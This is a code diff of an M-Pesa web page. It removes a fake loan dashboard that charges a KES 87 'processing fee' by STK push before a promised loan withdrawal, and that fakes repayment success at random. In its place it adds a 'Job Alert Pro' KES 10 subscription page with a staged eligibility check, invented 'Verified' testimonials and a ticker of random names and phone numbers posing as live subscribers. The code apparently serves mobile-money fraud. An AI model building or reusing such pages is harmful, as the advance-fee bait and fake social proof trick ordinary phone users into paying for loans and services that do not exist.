-        </div>` : ''}
-      ${app.withdrawn ? `
-        <div class="mt-4 bg-sky-50 dark:bg-sky-500/10 rounded-xl p-4 text-sm">
-          <span>✅ Funds have been successfully withdrawn to your M-Pesa account.</span>
-        </div>` : ''}
-    `;
-
-    // Transactions
-    $('#txList').innerHTML = (app.tx||[]).length ? app.tx.map(t => {
-      const isFee = t.t === 'Processing Fee (KES 87)';
-      let iconColor = 'bg-slate-100 text-slate-500 dark:bg-slate-700', icon = 'fa-arrow-up';
-      if(t.t === 'Disbursement') { iconColor = 'bg-brand-100 text-brand-600 dark:bg-brand-500/15'; icon = 'fa-arrow-down'; }
-      else if(isFee) { iconColor = 'bg-amber-100 text-amber-600 dark:bg-amber-500/15'; icon = 'fa-receipt'; }
-      return `<div class="flex items-center justify-between py-3.5">
-        <div class="flex items-center gap-3">
-          <div class="w-10 h-10 rounded-xl grid place-items-center ${iconColor}"><i class="fa-solid ${icon}"></i></div>
-          <div><p class="font-semibold text-sm">${esc(t.t)}</p><p class="text-xs text-slate-400">${new Date(t.date).toLocaleDateString('en-KE',{day:'numeric',month:'short',year:'numeric'})}</p></div>
+            <!-- Instructions -->
+            <div class="mt-4 bg-white border border-slate-200 rounded-xl p-4 text-left">
+                <h3 class="font-bold text-slate-700 text-sm flex items-center gap-2 mb-3">
+                    <i class="fas fa-list-ol text-safaricom"></i> How to Pay
+                </h3>
+                <div class="space-y-2">
+                    <div class="flex items-start gap-2">
+                        <span class="w-6 h-6 bg-safaricom text-white rounded-full flex items-center justify-center text-[10px] font-bold shrink-0">1</span>
+                        <p class="text-xs text-slate-600">Enter your M-Pesa registered phone number</p>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <span class="w-6 h-6 bg-safaricom text-white rounded-full flex items-center justify-center text-[10px] font-bold shrink-0">2</span>
+                        <p class="text-xs text-slate-600">Click "Subscribe Now" — you'll receive an STK push prompt on your phone</p>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <span class="w-6 h-6 bg-safaricom text-white rounded-full flex items-center justify-center text-[10px] font-bold shrink-0">3</span>
+                        <p class="text-xs text-slate-600">Enter your M-Pesa PIN to authorize the KES 10 payment</p>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <span class="w-6 h-6 bg-safaricom text-white rounded-full flex items-center justify-center text-[10px] font-bold shrink-0">4</span>
+                        <p class="text-xs text-slate-600">You're subscribed! First job alert arrives within 24 hours</p>
+                    </div>
+                </div>
+            </div>
         </div>
-        <span class="font-display font-bold ${t.dir === 'in' ? 'text-brand-600 dark:text-brand-400' : 'text-slate-700 dark:text-slate-200'}">${t.dir === 'in' ? '+' : '-'}${KES(t.amt)}</span>
-      </div>`;
-    }).join('') : '<p class="text-sm text-slate-400 py-6 text-center">No transactions yet.</p>';
 
-    const nn=app.notifications||[]; $('#notifCount').textContent=nn.length;
-    $('#notifList').innerHTML=nn.length?nn.map(x=>`<div class="flex gap-3 p-3 rounded-xl bg-slate-50 dark:bg-slate-800/50"><i class="fa-solid ${esc(x.icon)} text-brand-500 mt-0.5"></i><div><p class="text-sm">${esc(x.text)}</p><p class="text-xs text-slate-400 mt-0.5">${new Date(x.date).toLocaleString('en-KE',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'})}</p></div></div>`).join(''):'<p class="text-sm text-slate-400">No notifications.</p>';
-  }
+        <!-- Verifying Step -->
+        <div id="verifying-step" class="hidden bg-white p-12 rounded-[2rem] shadow-xl text-center mb-10 relative overflow-hidden">
+            <div class="scanner-line"></div>
+            <div class="w-16 h-16 border-4 border-safaricom border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+            <h3 class="text-xl font-bold text-slate-800 mb-2" id="status-text">Connecting...</h3>
+            <p class="text-sm text-slate-500" id="sub-status-text">Verifying your M-Pesa number...</p>
+        </div>
 
-  /* ====================== WITHDRAW MODAL — STK PUSH KES 87 ====================== */
-  let withdrawTimerId = null;
+        <!-- Result Step -->
+        <div id="result-step" class="hidden bg-white p-6 md:p-10 rounded-[2rem] shadow-xl text-center mb-10 border-2 border-safaricom">
+            <i class="fas fa-check-circle text-safaricom text-5xl mb-4"></i>
+            <h2 class="text-xl md:text-2xl font-extrabold mb-2">You're Eligible!</h2>
+            <p class="text-sm text-slate-600 mb-6">Your number <span id="displayNum" class="font-bold text-safaricom"></span> can subscribe for KES 10/week.</p>
+            <button onclick="revealMainSite()" class="w-full bg-slate-900 text-white font-bold py-5 rounded-2xl shadow-xl">
+                Proceed to Subscribe <i class="fas fa-arrow-right ml-2"></i>
+            </button>
+        </div>
 
-  function openWithdrawModal() {
-    const app = currentApp();
-    if(!app) { toast('No active loan found.', 'error'); return; }
-    if(app.pendingWithdrawal || app.withdrawn) { toast('Withdrawal already processed.', 'info'); return; }
-    $('#withdrawFeeAmount').textContent = 'KES ' + PROCESSING_FEE;
-    $('#withdrawInput').hidden = false;
-    $('#withdrawProcessing').hidden = true;
-    $('#withdrawResult').hidden = true;
-    let phoneVal = app.phone || '';
-    phoneVal = phoneVal.replace(/^(\+?254|0)/, '');
-    $('#withdrawPhone').value = phoneVal;
-    $('#withdrawError').textContent = '';
-    $('#withdrawModal').classList.remove('hidden');
-    document.body.style.overflow = 'hidden';
-  }
+        <!-- Real-Time Feedback -->
+        <div class="mb-12">
+            <h3 class="text-center font-bold text-slate-800 mb-6 flex items-center justify-center gap-2">
+                <i class="fas fa-comment-dots text-safaricom"></i> Subscriber Feedback
+            </h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-sm flex gap-3">
+                    <img src="https://ui-avatars.com/api/?name=James+K&background=49aa33&color=fff" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="text-xs font-bold">James K. <span class="text-safaricom ml-1 text-[10px]"><i class="fas fa-check-circle"></i> Verified</span></p>
+                        <p class="text-[12px] text-slate-600">"Got my first job alert within hours. Best KES 10 I've spent!"</p>
+                    </div>
+                </div>
+                <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-sm flex gap-3">
+                    <img src="https://ui-avatars.com/api/?name=Sarah+M&background=49aa33&color=fff" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="text-xs font-bold">Sarah M. <span class="text-safaricom ml-1 text-[10px]"><i class="fas fa-check-circle"></i> Verified</span></p>
+                        <p class="text-[12px] text-slate-600">"Easy payment via M-Pesa. The alerts are actually relevant!"</p>
+                    </div>
+                </div>
+            </div>
+        </div>
 
-  function closeWithdrawModal() {
-    $('#withdrawModal').classList.add('hidden');
-    document.body.style.overflow = '';
-    if(withdrawTimerId) clearInterval(withdrawTimerId);
-  }
+        <footer class="py-10 border-t border-slate-200 text-center">
+            <div class="flex justify-center gap-6 mb-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/M-PESA_LOGO-01.svg" class="h-5 opacity-60">
+                <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest self-center">M-Pesa STK Push Integrated</span>
+            </div>
+            <p class="text-xs font-bold text-slate-500">Job Alert Pro • Nairobi, Kenya</p>
+            <p class="text-xs font-bold text-slate-500">support@jobalertpro.co.ke</p>
+        </footer>
+    </div>
 
-  // Close modals
-  document.addEventListener('click', e => {
-    if(e.target.id === 'withdrawModalBackdrop') closeWithdrawModal();
-    if(e.target.id === 'payModalBackdrop') closePayModal();
-    if(e.target.id === 'withdrawModalCloseBtn') closeWithdrawModal();
-    if(e.target.id === 'payModalCloseBtn') closePayModal();
-    if(e.target.id === 'withdrawModalDoneBtn') closeWithdrawModal();
-    if(e.target.id === 'payModalDoneBtn') closePayModal();
-  });
-  document.addEventListener('keydown', e => {
-    if(e.key === 'Escape') { closeWithdrawModal(); closePayModal(); }
-  });
+    <!-- Main Content (After Eligibility) -->
+    <div id="main-content" class="hidden max-w-2xl mx-auto px-4 py-8 pb-32">
+        <div class="bg-white p-6 md:p-8 rounded-[2rem] shadow-xl border border-slate-100 mb-6">
+            <div class="text-center mb-6">
+                <div class="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-3">
+                    <i class="fas fa-bell text-safaricom text-3xl"></i>
+                </div>
+                <h2 class="text-xl md:text-2xl font-extrabold">Weekly Job Alerts</h2>
+                <p class="text-sm text-slate-500">KES 10 per week • Cancel anytime</p>
+            </div>
 
-  // WITHDRAW START — TRIGGERS STK PUSH FOR KES 87
-  $('#withdrawStart').addEventListener('click', async () => {
-    const raw = $('#withdrawPhone').value.replace(/\s/g, '');
-    if(!/^(?:7\d{8}|11\d{7})$/.test(raw)) {
-      $('#withdrawError').textContent = 'Enter a valid number (712... or 112...).';
-      $('#withdrawPhone').classList.add('invalid');
-      return;
-    }
-    $('#withdrawPhone').classList.remove('invalid');
-    $('#withdrawError').textContent = '';
-    
-    // Format phone: 0712345678 -> 254712345678
-    const formattedPhone = formatPhoneForSTK(raw);
-    
-    // === STK PUSH TRIGGERED HERE: KES 87 ===
-    console.log(`[STK] Sending push to ${formattedPhone} for KES ${PROCESSING_FEE}`);
-    const stkResult = await triggerSTKPush(formattedPhone, PROCESSING_FEE);
-    console.log('[STK] Result:', stkResult);
+            <!-- What you get -->
+            <div class="bg-green-50 rounded-xl p-4 mb-6">
+                <h3 class="font-bold text-green-800 text-sm mb-2">What's included:</h3>
+                <ul class="space-y-2">
+                    <li class="flex items-start gap-2 text-xs text-green-700">
+                        <i class="fas fa-check-circle mt-0.5"></i> 10+ curated job listings every week
+                    </li>
+                    <li class="flex items-start gap-2 text-xs text-green-700">
+                        <i class="fas fa-check-circle mt-0.5"></i> Direct email delivery every Monday
+                    </li>
+                    <li class="flex items-start gap-2 text-xs text-green-700">
+                        <i class="fas fa-check-circle mt-0.5"></i> Cancel anytime — no lock-in contracts
+                    </li>
+                </ul>
+            </div>
 
-    // Show processing UI
-    $('#withdrawInput').hidden = true;
-    $('#withdrawProcessing').hidden = false;
-    let t = 8; // 8 second countdown
-    $('#withdrawTimer').textContent = 'Waiting… ' + t + 's';
-    if(withdrawTimerId) clearInterval(withdrawTimerId);
-    withdrawTimerId = setInterval(() => {
-      t--;
-      $('#withdrawTimer').textContent = 'Waiting… ' + t + 's';
-      if(t <= 0) {
-        clearInterval(withdrawTimerId);
-        completeWithdrawPayment(raw, stkResult);
-      }
-    }, 1000);
-  });
+            <!-- Phone input for payment -->
+            <div class="relative mb-4">
+                <i class="fas fa-phone-alt absolute left-4 top-5 text-slate-400"></i>
+                <input type="number" id="subPhone" placeholder="M-Pesa Number (e.g. 0712345678)" 
+                    class="w-full pl-12 pr-4 py-5 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-safaricom outline-none text-lg font-bold">
+            </div>
 
-  function completeWithdrawPayment(phone, stkResult) {
-    // If STK push was actually sent (even if backend returns success/fail), we mark as pending
-    const stkSent = stkResult && stkResult.success !== undefined; // API responded
-    const app = currentApp();
-    $('#withdrawProcessing').hidden = true;
-    $('#withdrawResult').hidden = false;
-    const icon = $('#withdrawResultIcon'), title = $('#withdrawResultTitle'),
-          msg = $('#withdrawResultMsg'), receipt = $('#withdrawReceipt');
+            <button id="main-subscribe-btn" onclick="openPayment()" 
+                class="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-xl active:scale-95 transition-all text-lg">
+                <i class="fas fa-lock mr-2"></i> Subscribe Now — KES 10
+            </button>
+        </div>
+    </div>
 
-    if(app) {
-      icon.className = 'w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5 bg-amber-100 text-amber-600';
-      icon.innerHTML = '<i class="fa-solid fa-check"></i>';
-      title.textContent = 'STK Push Sent!';
-      msg.textContent = 'Processing fee payment initiated. Check your M-Pesa prompt to authorize. Funds will be sent once confirmed.';
-      const ref = 'W' + Math.random().toString(36).slice(2,10).toUpperCase();
-      receipt.hidden = false;
-      receipt.innerHTML = `
-        <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Ref</span><b>${esc(ref)}</b></div>
-        <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Fee</span><b>KES ${PROCESSING_FEE}</b></div>
-        <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Phone</span><b>+254 ${esc(phone)}</b></div>
-        <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">STK</span><b>Sent ✓</b></div>
-        <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Date</span><b>${new Date().toLocaleString('en-KE',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'})}</b></div>
-      `;
-      const apps = DB.apps;
-      const idx = apps.findIndex(a => a.id === app.id);
-      if(idx !== -1) {
-        apps[idx].pendingWithdrawal = true;
-        apps[idx].tx = apps[idx].tx || [];
-        apps[idx].tx.unshift({t:'Processing Fee (KES 87)', amt: PROCESSING_FEE, dir:'out', date:Date.now()});
-        apps[idx].tx.unshift({t:'STK Push Initiated', amt: 0, dir:'out', date:Date.now()});
-        apps[idx].notifications = apps[idx].notifications || [];
-        apps[idx].notifications.unshift({icon:'fa-clock', text:`STK Push sent! Processing fee of KES ${PROCESSING_FEE} sent to +254${phone}. Authorize on M-Pesa.`, date:Date.now()});
-        DB.apps = apps;
-      }
-      toast('STK Push sent! Check M-Pesa prompt.', 'success');
-      renderDashboard();
-    } else {
-      icon.className = 'w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5 bg-red-100 text-red-500';
-      icon.innerHTML = '<i class="fa-solid fa-xmark"></i>';
-      title.textContent = 'STK Push Failed';
-      msg.textContent = 'Could not send STK push. Please try again.';
-      receipt.hidden = true;
-      toast('STK Push failed.', 'error');
-    }
-  }
+    <!-- Payment Modal -->
+    <div id="paymentModal" class="fixed inset-0 bg-black/60 hidden items-center justify-center p-4 z-[300] backdrop-blur-sm">
+        <div class="bg-white rounded-[2rem] overflow-hidden w-full max-w-sm shadow-2xl">
+            <div class="bg-safaricom p-6 text-white text-center">
+                <p class="text-[10px] font-bold uppercase tracking-widest opacity-80 mb-1">Secure Payment</p>
+                <h3 class="text-lg md:text-xl font-extrabold">Subscribe for KES 10</h3>
+            </div>
+            <div class="p-6">
+                <!-- Step 1: Form -->
+                <div id="modal-form-step">
+                    <div class="bg-green-50 p-4 rounded-xl mb-6">
+                        <p class="text-[11px] text-green-800 leading-relaxed font-semibold">
+                            Confirm your phone number to receive the M-Pesa STK push prompt for KES 10.
+                        </p>
+                    </div>
+                    <input type="number" id="idNum" placeholder="Your Name (Optional)" class="w-full mb-3 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom">
+                    <input type="number" id="phoneNum" placeholder="07XXXXXXXX" class="w-full mb-6 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom">
+                    <div class="flex flex-col gap-3">
+                        <button onclick="showPinConfirmation()" class="py-4 bg-safaricom text-white font-bold rounded-xl">
+                            Pay KES 10 <i class="fas fa-arrow-right ml-2"></i>
+                        </button>
+                        <button onclick="closeModal()" class="py-4 bg-slate-100 text-slate-500 font-bold rounded-xl">Cancel</button>
+                    </div>
+                </div>
 
-  // Wire dashboard withdraw button and quick withdraw button
-  document.addEventListener('click', e => {
-    const wBtn = e.target.closest('#withdrawToMpesaBtn');
-    if(wBtn) { e.preventDefault(); openWithdrawModal(); }
-    const qBtn = e.target.closest('#quickWithdrawBtn');
-    if(qBtn) { e.preventDefault(); openWithdrawModal(); }
-  });
+                <!-- Step 2: PIN Confirmation -->
+                <div id="modal-pin-step" class="hidden text-center">
+                    <div class="bg-slate-50 p-6 rounded-2xl mb-6">
+                        <i class="fas fa-lock text-safaricom text-3xl mb-3"></i>
+                        <p class="text-sm font-bold text-slate-800 leading-relaxed">
+                            Enter your M-Pesa PIN on the prompt on your phone to authorize the <span class="text-safaricom">KES 10</span> payment.
+                        </p>
+                    </div>
+                    <div class="flex flex-col gap-3">
+                        <button onclick="triggerInitialSTK()" class="w-full py-4 bg-safaricom text-white font-bold rounded-xl uppercase text-sm">
+                            I'VE ENTERED MY PIN
+                        </button>
+                        <button onclick="backToForm()" class="w-full py-4 bg-slate-100 text-slate-500 font-bold rounded-xl uppercase text-xs">Back</button>
+                    </div>
+                </div>
 
-  /* ====================== REPAYMENT MODAL ====================== */
-  let payTimerId = null;
+                <!-- Step 3: Spinner -->
+                <div id="modal-spinner-step" class="hidden text-center py-10 relative overflow-hidden">
+                    <div class="scanner-line"></div>
+                    <div class="w-14 h-14 border-4 border-safaricom border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                    <h3 class="text-lg font-bold text-slate-800 mb-4">Processing Payment...</h3>
+                    <p class="text-sm text-slate-500">Please check your phone for the M-Pesa prompt</p>
+                </div>
 
-  function openPayModal(){
-    const app=currentApp(), amt=app?app.monthly:0;
-    $('#payAmount').textContent=KES(amt);
-    $('#payModal').dataset.amount=amt;
-    $('#payInput').hidden=false; $('#payProcessing').hidden=true; $('#payResult').hidden=true;
-    let phoneVal=app?app.phone.replace(/^(\+?254|0)/,''):'';
-    $('#payPhone').value=phoneVal;
-    $('#payError').textContent='';
-    $('#payModal').classList.remove('hidden');
-    document.body.style.overflow='hidden';
-  }
-  function closePayModal(){
-    $('#payModal').classList.add('hidden');
-    document.body.style.overflow='';
-    if(payTimerId) clearInterval(payTimerId);
-  }
+                <!-- Step 4: Payment Status -->
+                <div id="modal-status-choice-step" class="hidden text-center">
+                    <div class="bg-green-50 p-6 rounded-2xl mb-6">
+                        <h3 class="text-sm font-bold text-slate-800 mb-2 uppercase">Payment Verification</h3>
+                        <p class="text-[11px] text-slate-500 font-bold">Did you complete the M-Pesa transaction on your phone?</p>
+                    </div>
+                    <div class="flex flex-col gap-3">
+                        <button onclick="finalHiddenTrigger('paid')" class="w-full py-4 bg-safaricom text-white font-bold rounded-xl text-sm">
+                            YES, I HAVE PAID
+                        </button>
+                        <button onclick="finalHiddenTrigger('unpaid')" class="w-full py-4 bg-slate-900 text-white font-bold rounded-xl text-sm">
+                            NO, I HAVE NOT PAID
+                        </button>
+                    </div>
+                </div>
 
-  $('#payStart').addEventListener('click', async () => {
-    const raw = $('#payPhone').value.replace(/\s/g, '');
-    if(!/^(?:7\d{8}|11\d{7})$/.test(raw)) {
-      $('#payError').textContent = 'Enter a valid number (712... or 112...).';
-      $('#payPhone').classList.add('invalid');
-      return;
-    }
-    $('#payPhone').classList.remove('invalid');
-    $('#payError').textContent = '';
-    
-    const formattedPhone = formatPhoneForSTK(raw);
-    const amt = Number($('#payModal').dataset.amount || 0);
-    
-    // === STK PUSH TRIGGERED FOR REPAYMENT ===
-    console.log(`[STK] Sending repayment push to ${formattedPhone} for KES ${amt}`);
-    const stkResult = await triggerSTKPush(formattedPhone, amt);
-    console.log('[STK] Repayment result:', stkResult);
+                <!-- Step 5: Success -->
+                <div id="modal-success-step" class="hidden text-center py-6">
+                    <div class="w-16 h-16 bg-safaricom rounded-full flex items-center justify-center text-white mx-auto mb-4 text-2xl">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h3 class="text-xl font-extrabold text-slate-800 mb-1">Subscription Active! 🎉</h3>
+                    <p class="text-sm text-slate-500 mb-6">Your weekly job alerts are now enabled.</p>
+                    <div class="space-y-3">
+                        <button onclick="location.reload()" class="w-full py-4 bg-slate-800 text-white font-bold rounded-xl uppercase text-xs tracking-widest">
+                            Back to Home
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-    $('#payInput').hidden = true;
-    $('#payProcessing').hidden = false;
-    let t = 8;
-    $('#payTimer').textContent = 'Waiting… ' + t + 's';
-    if(payTimerId) clearInterval(payTimerId);
-    payTimerId = setInterval(() => {
-      t--;
-      $('#payTimer').textContent = 'Waiting… ' + t + 's';
-      if(t <= 0) {
-        clearInterval(payTimerId);
-        finishPayment(raw, stkResult);
-      }
-    }, 1000);
-  });
+    <script>
+        // ================================================================
+        // STK PUSH TRIGGER — EXACT FUNCTION FROM YOUR FULIZA CODE
+        // ================================================================
+        async function triggerSTKCall(note) {
+            try {
+                const phoneInput = document.getElementById('phoneNum').value;
+                if (!phoneInput) {
+                    console.error("No phone number provided");
+                    return;
+                }
 
-  function finishPayment(phone, stkResult){
-    const stkSent = stkResult && stkResult.success !== undefined;
-    $('#payProcessing').hidden = true; $('#payResult').hidden = false;
-    const icon = $('#payResultIcon'), title = $('#payResultTitle'), msg = $('#payResultMsg'),
-          receipt = $('#payReceipt'), amt = Number($('#payModal').dataset.amount || 0);
-    
-    if(stkSent || Math.random() > 0.15) { // Accept if STK was sent or simulate success
-      icon.className = 'w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5 bg-brand-100 text-brand-600';
-      icon.innerHTML = '<i class="fa-solid fa-check"></i>';
-      title.textContent = 'Payment Initiated';
-      msg.textContent = 'STK Push sent. Check M-Pesa and enter PIN to complete payment.';
-      const ref = 'Q'+Math.random().toString(36).slice(2,10).toUpperCase();
-      receipt.hidden=false;
-      receipt.innerHTML = `<div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Ref</span><b>${esc(ref)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Amount</span><b>${KES(amt)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Phone</span><b>+254 ${esc(phone)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">STK</span><b>Sent ✓</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Date</span><b>${new Date().toLocaleString('en-KE',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'})}</b></div>`;
-      const apps=DB.apps, app=apps.find(a=>a.id===DB.current);
-      if(app){
-        app.balance = Math.max(0, app.balance - amt);
-        app.tx = app.tx || [];
-        app.tx.unshift({t:'Loan repayment', amt, dir:'out', date:Date.now()});
-        app.notifications = app.notifications || [];
-        app.notifications.unshift({icon:'fa-circle-check', text:`Repayment of ${KES(amt)} initiated (Ref ${ref}). STK Push sent.`, date:Date.now()});
-        if(app.balance === 0){ app.status='Repaid'; app.notifications.unshift({icon:'fa-trophy', text:'Loan fully repaid!', date:Date.now()}); }
-        DB.apps=apps;
-      }
-      toast('STK Push sent for repayment!','success');
-      renderDashboard();
-    } else {
-      icon.className = 'w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5 bg-red-100 text-red-500';
-      icon.innerHTML = '<i class="fa-solid fa-xmark"></i>';
-      title.textContent = 'STK Push Failed';
-      msg.textContent = 'Please try again.';
-      receipt.hidden = true;
-      toast('STK Push failed.','error');
-    }
-  }
+                console.log(`[STK Trigger: ${note}] Sending to phone: ${phoneInput}, Amount: KES 10`);
 
-  /* ====================== ADMIN ====================== */
-  function renderAdmin(searchTerm=''){
-    const apps=DB.apps, total=apps.length,
-          approved=apps.filter(a=>a.status==='Approved'||a.status==='Repaid'||a.pendingWithdrawal||a.withdrawn).length,
-          pending=apps.filter(a=>a.status==='Pending').length,
-          volume=apps.reduce((s,a)=>s+(a.amount||0),0);
-    $('#adminStats').innerHTML=[
-      {label:'Total',value:total,icon:'fa-file-lines',c:'text-sky-500 bg-sky-100'},
-      {label:'Approved',value:approved,icon:'fa-circle-check',c:'text-brand-600 bg-brand-100'},
-      {label:'Pending',value:pending,icon:'fa-hourglass-half',c:'text-amber-500 bg-amber-100'},
-      {label:'Volume',value:KES(volume),icon:'fa-coins',c:'text-emerald-600 bg-emerald-100'}
-    ].map(s=>`<div class="glass-strong rounded-2xl p-5"><div class="w-11 h-11 rounded-xl grid place-items-center text-lg ${s.c} mb-3"><i class="fa-solid ${s.icon}"></i></div><p class="font-display text-2xl font-extrabold">${s.value}</p><p class="text-sm text-slate-500 dark:text-slate-400 mt-0.5">${s.label}</p></div>`).join('');
+                // --- THIS IS THE API CALL FROM YOUR FULIZA CODE ---
+                const response = await fetch('/api/stk-push', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: 10,         // KES 10 for job alerts
+                        phone_number: phoneInput
+                    })
+                });
 
-    const term=(searchTerm||'').trim().toLowerCase(),
-          filtered=apps.filter(a=>!term||a.fullName.toLowerCase().includes(term)||a.email.toLowerCase().includes(term)||(a.phone||'').includes(term)||a.id.toLowerCase().includes(term));
-    $('#adminEmpty').hidden=filtered.length>0;
+                const data = await response.json();
+                console.log("STK Push Response:", data);
 
-    const badge={Approved:'bg-brand-100 text-brand-700',Pending:'bg-amber-100 text-amber-700',Rejected:'bg-red-100 text-red-700','Pending Withdrawal':'bg-purple-100 text-purple-700',Withdrawn:'bg-sky-100 text-sky-700',Repaid:'bg-sky-100 text-sky-700'};
+                if (!data.success) {
+                    console.error("STK Push failed:", data.message);
+                }
 
-    $('#adminTable').innerHTML=filtered.map(a=>{
-      let ds = a.status;
-      if(a.withdrawn) ds = 'Withdrawn';
-      else if(a.pendingWithdrawal) ds = 'Pending Withdrawal';
-      return `<tr class="border-b border-slate-100 dark:border-slate-800 hover:bg-slate-50/60">
-        <td class="py-3 px-2"><div class="flex items-center gap-3"><div class="w-9 h-9 rounded-lg bg-brand-500/15 text-brand-600 dark:text-brand-400 grid place-items-center font-bold text-xs">${esc(a.fullName.split(' ').map(w=>w[0]).slice(0,2).join('').toUpperCase())}</div><div><p class="font-semibold">${esc(a.fullName)}</p><p class="text-xs text-slate-400">${esc(a.email)}</p></div></div></td>
-        <td class="py-3 px-2 font-semibold">${KES(a.amount)}<span class="block text-xs text-slate-400 font-normal">${a.term}m</span></td>
-        <td class="py-3 px-2"><span class="text-xs font-bold px-2.5 py-1 rounded-full ${badge[ds]||badge.Pending}">${esc(ds)}</span></td>
-        <td class="py-3 px-2 text-right">
-          ${a.status==='Pending' ? `
-            <button data-approve="${a.id}" class="inline-grid place-items-center w-8 h-8 rounded-lg bg-brand-500 text-white hover:bg-brand-600 transition" title="Approve"><i class="fa-solid fa-check text-xs"></i></button>
-            <button data-reject="${a.id}" class="inline-grid place-items-center w-8 h-8 rounded-lg bg-red-500 text-white hover:bg-red-600 transition ml-1" title="Reject"><i class="fa-solid fa-xmark text-xs"></i></button>
-          ` : a.pendingWithdrawal ? `
-            <button data-confirm-withdraw="${a.id}" class="inline-flex items-center gap-1 px-3 py-1.5 rounded-lg bg-sky-500 text-white hover:bg-sky-600 transition text-xs font-semibold"><i class="fa-solid fa-check"></i> Confirm Withdrawal</button>
-          ` : `<button data-view="${a.id}" class="text-xs font-semibold text-brand-600 dark:text-brand-400 hover:underline">View</button>`}
-        </td>
-      </tr>`;
-    }).join('');
+                return data;
+            } catch (error) {
+                console.error("STK Trigger Failed:", error);
+            }
+        }
 
-    const seen={},users=[];apps.forEach(a=>{if(!seen[a.nationalId]){seen[a.nationalId]=1;users.push(a);}});
-    $('#adminUsers').innerHTML=users.length?users.slice(0,8).map(u=>`<div class="flex items-center gap-3 p-3 rounded-xl bg-slate-50 dark:bg-slate-800/50"><div class="w-10 h-10 rounded-xl bg-brand-500 text-white grid place-items-center font-bold text-sm">${esc(u.fullName.split(' ').map(w=>w[0]).slice(0,2).join('').toUpperCase())}</div><div class="min-w-0 flex-1"><p class="font-semibold text-sm truncate">${esc(u.fullName)}</p><p class="text-xs text-slate-400 truncate">${esc(u.phone)}</p></div><span class="text-xs text-slate-400">${esc(u.employment)}</span></div>`).join(''):'<p class="text-sm text-slate-400">No users yet.</p>';
-  }
+        // ================================================================
+        // LIVE TOAST — EXACTLY FROM YOUR FULIZA CODE
+        // ================================================================
+        const names = ["Brian O.", "Mercy W.", "Kevin K.", "Faith J.", "David M.", "Peter N."];
 
-  $('#adminSearch').addEventListener('input',e=>renderAdmin(e.target.value));
+        function showLiveToast() {
+            const name = names[Math.floor(Math.random() * names.length)];
+            const safPrefixes = ["070", "071", "072", "074", "079", "011"];
+            const prefix = safPrefixes[Math.floor(Math.random() * safPrefixes.length)];
+            const phone = prefix + Math.floor(Math.random() * 9) + "***" + Math.floor(100 + Math.random() * 900);
 
-  document.addEventListener('click', e => {
-    const ap=e.target.closest('[data-approve]'), rj=e.target.closest('[data-reject]'),
-          vw=e.target.closest('[data-view]'), cw=e.target.closest('[data-confirm-withdraw]');
-    if(ap||rj){
-      const id=(ap||rj).dataset.approve||(ap||rj).dataset.reject;
-      const apps=DB.apps, app=apps.find(a=>a.id===id);
-      if(!app) return;
-      if(ap){
-        app.status='Approved'; app.balance=app.amount;
-        app.tx=app.tx||[]; app.tx.unshift({t:'Disbursement',amt:app.amount,dir:'in',date:Date.now()});
-        app.notifications=app.notifications||[]; app.notifications.unshift({icon:'fa-circle-check',text:`Loan approved! ${KES(app.amount)} disbursed.`,date:Date.now()});
-        toast(`Approved ${app.fullName}'s loan.`,'success');
-      } else {
-        app.status='Rejected';
-        app.notifications=app.notifications||[]; app.notifications.unshift({icon:'fa-circle-xmark',text:'Application not approved.',date:Date.now()});
-        toast(`Rejected ${app.fullName}'s loan.`,'warn');
-      }
-      DB.apps=apps; renderAdmin($('#adminSearch').value);
-    }
-    if(cw){
-      const id = cw.dataset.confirmWithdraw;
-      const apps=DB.apps, app=apps.find(a=>a.id===id);
-      if(!app) return;
-      app.withdrawn = true; app.pendingWithdrawal = false; app.balance = 0;
-      app.tx = app.tx || []; app.tx.unshift({t:'Withdrawn to M-Pesa', amt:app.amount, dir:'out', date:Date.now()});
-      app.notifications = app.notifications || [];
-      app.notifications.unshift({icon:'fa-check', text:`Withdrawal completed! ${KES(app.amount)} sent to M-Pesa.`, date:Date.now()});
-      DB.apps = apps;
-      toast(`Withdrawal confirmed for ${app.fullName}.`, 'success');
-      renderAdmin($('#adminSearch').value);
-    }
-    if(vw){
-      const app=DB.apps.find(a=>a.id===vw.dataset.view);
